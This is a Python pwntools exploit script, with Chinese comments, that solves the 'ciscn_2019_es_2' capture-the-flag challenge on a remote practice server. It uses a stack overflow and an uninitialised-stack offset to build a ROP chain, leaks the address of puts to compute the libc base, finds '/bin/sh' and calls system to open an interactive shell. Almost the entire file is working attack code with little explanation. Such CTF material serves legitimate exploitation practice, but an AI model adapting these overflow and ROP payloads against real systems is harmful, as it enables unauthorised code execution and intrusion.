#利用栈没有初始化 两次输入错位来rop
from pwn import *
context.log_level = 'debug'
#p = process("./ciscn_2019_es_2")
p = remote("pwn.buuoj.cn", 20174)
elf = ELF("./ciscn_2019_es_2")
libc = ELF("./x86_libc.so.6")
puts_got = elf.got['puts']
call_puts = 0x804861d
call_system = 0x8048559
if args.G:
	gdb.attach(p)

main_addr = 0x80485ff
#round1
p.recvuntil("name?\n")
p.send("aa")
p.recvline()
payload = 'a'*(44-12) + p32(puts_got) + p32(0)*2 + p32(main_addr)
p.send(payload)

p.recvuntil("name?\n")
p.send("aa")
p.recvline()
 #round2 由于下一次read参数中的buf正好比上次少0x10。可通过构造出call_puts,puts_got的栈空间来
payload = 'a' * 44  + p32(call_puts)     #由于直接用plt会缺少一个位置，所以直接用call可以省下一个返回地址都构造 
p.send(payload)
p.recvline()
puts_addr = u32(p.recv(4))
log.success("puts_addr ==> " + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
log.success("libc_base ==> " + hex(libc_base))
binsh_addr = libc_base + libc.search('/bin/sh').next()
#round3 这次的buf位置与第一次一样 直接把binsh_addr放在下一次system的后面就可以了
p.send("aa")
p.recvline()
payload = 'a' * (44-12) + p32(binsh_addr) + p32(0)*2 + p32(main_addr)
p.send(payload)
#round4 摆放好system
p.recvuntil("name?\n")
p.send("aa")
p.recvline()
p.sendline('a' * 44 + p32(call_system))

p.interactive()
